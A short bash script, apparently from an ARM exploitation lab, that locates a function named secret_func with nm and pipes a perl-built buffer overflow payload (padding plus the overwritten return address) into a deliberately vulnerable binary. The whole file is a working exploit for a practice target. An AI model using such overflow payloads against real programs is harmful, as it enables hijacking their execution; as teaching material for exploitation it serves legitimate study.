#!/bin/bash

# Find &secret_func
# $ nm ./arm_bof_vuln |grep secret
# 000104fc t secret_func

perl -e 'print "A"x12 . "B"x4 . "\xfc\x04\x01\x00"' | ./arm_bof_vuln
